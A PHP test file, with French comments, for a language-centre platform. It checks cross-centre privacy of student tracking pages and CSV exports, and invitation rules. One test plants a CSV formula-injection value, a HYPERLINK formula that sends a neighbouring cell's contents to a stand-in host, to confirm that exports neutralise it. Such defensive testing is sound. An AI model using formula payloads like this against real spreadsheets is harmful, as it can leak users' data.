<?php

use App\Models\Classroom;
use App\Models\Exam;
use App\Models\ExamSection;
use App\Models\Exercise;
use App\Models\ExerciseType;
use App\Models\Language;
use App\Models\LanguageCenter;
use App\Models\TeacherInvitation;
use App\Models\User;
use App\Models\UserError;
use App\Models\UserExerciseAttempt;
use App\Models\UserProfile;

/**
 * Le suivi d'un centre ne montre que SES eleves, et rien du contenu prive d'un
 * autre centre.
 *
 * Depuis qu'une personne peut appartenir a plusieurs centres, la fiche de suivi
 * s'ouvrait aussi sur un enseignant — avec ce qu'il avait fait ailleurs —, et la
 * copie d'un eleve venu d'un autre centre montrait les exercices prives de
 * celui-ci, questions et bonnes reponses comprises.
 */
beforeEach(fn () => $this->withoutVite());

function centresEtSuivi(): array
{
    $langue = Language::create(['slug' => 'german', 'name' => 'Allemand', 'native_name' => 'Deutsch', 'flag' => 'de']);
    $exam = Exam::create(['language_id' => $langue->id, 'slug' => 'goethe', 'name' => 'Goethe-Zertifikat']);
    $section = ExamSection::create(['exam_id' => $exam->id, 'slug' => 'lesen', 'name' => 'Lesen', 'skill_type' => 'reading']);
    $type = ExerciseType::create(['section_id' => $section->id, 'slug' => 'mcq', 'name' => 'QCM', 'skill_type' => 'reading', 'component_key' => 'mcq']);

    $centre = fn (string $nom) => LanguageCenter::create([
        'name' => $nom, 'slug' => \Illuminate\Support\Str::slug($nom), 'owner_email' => 'x@exemple.test', 'is_active' => true,
    ]);
    $a = $centre('Centre Akwa');
    $b = $centre('Centre Bonamoussadi');

    $personne = function (array $roles) {
        $u = User::factory()->create();
        UserProfile::factory()->for($u)->create(['onboarding_completed_at' => now()]);
        foreach ($roles as [$c, $role]) {
            $c->members()->attach($u->id, ['role' => $role, 'joined_at' => now()]);
        }

        return $u;
    };

    $respB = $personne([[$b, 'center_admin']]);
    // Enseignante dans les deux centres.
    $prof = $personne([[$a, 'teacher'], [$b, 'teacher']]);
    $collegue = $personne([[$b, 'teacher']]);
    // Passee de A a B : elle n'est plus membre de A.
    $eleve = $personne([[$b, 'student']]);

    $classeB = $b->classrooms()->create(['name' => 'Groupe B1', 'level' => 'B1', 'exam_id' => $exam->id, 'invite_code' => Classroom::generateInviteCode()]);
    $classeB->members()->attach($collegue->id, ['role_in_class' => 'teacher']);
    $classeB->members()->attach($prof->id, ['role_in_class' => 'teacher']);
    $classeB->members()->attach($eleve->id, ['role_in_class' => 'student']);

    $exercice = fn (?LanguageCenter $c, string $titre) => Exercise::create([
        'exam_id' => $exam->id, 'exercise_type_id' => $type->id, 'exam_section_id' => $section->id, 'center_id' => $c?->id,
        'difficulty' => 'B1', 'is_ai_generated' => false,
        'content' => ['title' => $titre, 'instructions' => 'Consigne privée de A', 'passage' => 'Texte privé de A'],
        'questions' => [['id' => 'q1', 'type' => 'mcq', 'text' => 'Question privée de A', 'options' => ['Faux', 'Réponse privée de A'], 'correct_answer' => 'B', 'explanation' => 'Explication privée de A']],
    ]);
    $priveDeA = $exercice($a, 'Dictée maison du centre A');
    $public = $exercice(null, 'Goethe B1 · Lesen');

    $tentative = fn (User $u, Exercise $e) => UserExerciseAttempt::create([
        'user_id' => $u->id, 'exercise_id' => $e->id, 'answers' => ['q1' => 'A'], 'score' => 0, 'accuracy_percent' => 0,
        'time_spent' => 60, 'xp_earned' => 0,
        'feedback' => [['question_id' => 'q1', 'correct' => false, 'accuracy' => 0, 'correct_answer' => 'Réponse privée de A', 'explanation' => 'Explication privée de A']],
    ]);

    return compact('a', 'b', 'respB', 'prof', 'collegue', 'eleve', 'classeB', 'priveDeA', 'public', 'tentative', 'exam');
}

function dansLeCentre(User $u, LanguageCenter $c): array
{
    return [\App\Models\User::CENTRE_COURANT => $c->id];
}

/** Les donnees envoyees a la page, en clair : le HTML les encode (« é »). */
function donneesDeLaPage(\Illuminate\Testing\TestResponse $reponse): string
{
    return json_encode($reponse->viewData('page')['props'], JSON_UNESCAPED_UNICODE);
}

test('la fiche de suivi ne s ouvre pas sur un enseignant, ni ce qu il a fait ailleurs', function () {
    $d = centresEtSuivi();
    $t = ($d['tentative'])($d['prof'], $d['priveDeA']);

    foreach ([
        route('center.students.show', $d['prof']),
        route('center.students.attempt', [$d['prof'], $t]),
        route('center.students.export', $d['prof']),
    ] as $url) {
        // Ni la responsable de B, ni une collegue qui partage sa classe.
        $this->actingAs($d['respB'])->withSession(dansLeCentre($d['respB'], $d['b']))->get($url)->assertForbidden();
        $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))->get($url)->assertForbidden();
    }
});

test('l eleve de la classe reste suivi par son enseignante et sa responsable', function () {
    $d = centresEtSuivi();

    $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.students.show', $d['eleve']))->assertOk();
    $this->actingAs($d['respB'])->withSession(dansLeCentre($d['respB'], $d['b']))
        ->get(route('center.students.show', $d['eleve']))->assertOk();
});

test('la copie d un exercice prive d un autre centre ne montre pas son contenu', function () {
    $d = centresEtSuivi();
    $t = ($d['tentative'])($d['eleve'], $d['priveDeA']);

    $reponse = $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.students.attempt', [$d['eleve'], $t]))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->where('tentative.contenu_prive', true)
            ->where('tentative.questions', [])
            ->where('tentative.consigne', null)
            ->where('tentative.texte', null));

    expect(donneesDeLaPage($reponse))->not->toContain('privée de A')
        ->not->toContain('Dictée maison du centre A')
        // Ce qui est a l'eleve reste : le moment et le resultat.
        ->toContain('"precision":0');
});

test('la fiche et l export ne montrent ni le titre ni les questions d un autre centre', function () {
    $d = centresEtSuivi();
    ($d['tentative'])($d['eleve'], $d['priveDeA']);
    ($d['tentative'])($d['eleve'], $d['public']);
    UserError::create([
        'user_id' => $d['eleve']->id, 'exercise_id' => $d['priveDeA']->id, 'question_id' => 'q1',
        'question_text' => 'Question privée de A', 'user_answer' => 'Faux', 'correct_answer' => 'Réponse privée de A',
        'explanation' => 'Explication privée de A', 'skill_type' => 'reading', 'exercise_type_slug' => 'mcq',
        'error_category' => 'reading', 'mastered' => false,
    ]);

    $fiche = $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.students.show', $d['eleve']))->assertOk();
    $csv = $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.students.export', $d['eleve']))->assertOk()->streamedContent();

    expect(donneesDeLaPage($fiche))->not->toContain('privée de A')->not->toContain('Dictée maison du centre A')
        // L'exercice public, lui, reste nomme ; la faiblesse reste comptee.
        ->toContain('Goethe B1 · Lesen')
        ->toContain('"nombre":1')
        ->and($csv)->not->toContain('Dictée maison du centre A')->toContain('Goethe B1 · Lesen');
});

test('les exports neutralisent une cellule qui commencerait une formule', function () {
    $d = centresEtSuivi();
    $d['eleve']->update(['name' => '=HYPERLINK("https://exemple.test/?"&A3;"Voir")']);
    $piege = Exercise::create($d['public']->only(['exam_id', 'exercise_type_id', 'exam_section_id', 'difficulty', 'is_ai_generated', 'questions'])
        + ['content' => ['title' => '=1+1']]);
    ($d['tentative'])($d['eleve'], $piege);

    $classe = $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.classes.export', $d['classeB']))->assertOk()->streamedContent();
    $fiche = $this->actingAs($d['collegue'])->withSession(dansLeCentre($d['collegue'], $d['b']))
        ->get(route('center.students.export', $d['eleve']))->assertOk()->streamedContent();

    expect($classe)->toContain("'=HYPERLINK")->not->toMatch('/(^|;|")=HYPERLINK/m')
        ->and($fiche)->toContain("'=1+1")->not->toMatch('/(^|;)=1\+1/m');
});

test('une responsable invite une enseignante deja inscrite dans un autre centre', function () {
    $d = centresEtSuivi();
    $ailleurs = User::factory()->create();
    UserProfile::factory()->for($ailleurs)->create(['onboarding_completed_at' => now()]);
    $d['a']->members()->attach($ailleurs->id, ['role' => 'teacher', 'joined_at' => now()]);

    $this->actingAs($d['respB'])->withSession(dansLeCentre($d['respB'], $d['b']))
        ->post(route('teach.invitations.store'), ['name' => $ailleurs->name, 'email' => $ailleurs->email, 'classroom_name' => 'Groupe du soir'])
        ->assertSessionHasNoErrors();

    expect(TeacherInvitation::where('email', $ailleurs->email)->where('center_id', $d['b']->id)->exists())->toBeTrue();
});

test('on n invite ni un eleve ni quelqu un deja membre du centre', function () {
    $d = centresEtSuivi();

    foreach ([$d['eleve'], $d['collegue']] as $cible) {
        $this->actingAs($d['respB'])->withSession(dansLeCentre($d['respB'], $d['b']))
            ->post(route('teach.invitations.store'), ['name' => 'X', 'email' => $cible->email, 'classroom_name' => 'G'])
            ->assertSessionHasErrors('email');
    }

    expect(TeacherInvitation::count())->toBe(0);
});

test('la copie montre le texte de l option choisie, meme sous forme de carte lettree', function () {
    $d = centresEtSuivi();
    $carte = ['A' => 'Montag', 'B' => 'Dienstag', 'C' => 'Mittwoch'];
    $jours = Exercise::create($d['public']->only(['exam_id', 'exercise_type_id', 'exam_section_id', 'difficulty', 'is_ai_generated'])
        + ['content' => ['title' => 'Wochentage'], 'questions' => [['id' => 'q1', 'type' => 'mcq', 'text' => 'Welcher Tag?', 'options' => [$carte, $carte, $carte], 'correct_answer' => 'B']]]);
    $t = ($d['tentative'])($d['eleve'], $jours);

    $detail = app(\App\Services\Center\SuiviApprenant::class)->detail($t);

    expect($detail['questions'][0]['options'])->toBe(['Montag', 'Dienstag', 'Mittwoch']);
});

test('une question restee sans correction apres une panne n est pas affichee fausse', function () {
    $d = centresEtSuivi();
    $t = ($d['tentative'])($d['eleve'], $d['public']);
    $t->update(['feedback' => [['question_id' => 'q1', 'correct' => false, 'accuracy' => 0, 'technical_failure' => true]]]);

    $detail = app(\App\Services\Center\SuiviApprenant::class)->detail($t);

    expect($detail['questions'][0]['juste'])->toBeNull();
});
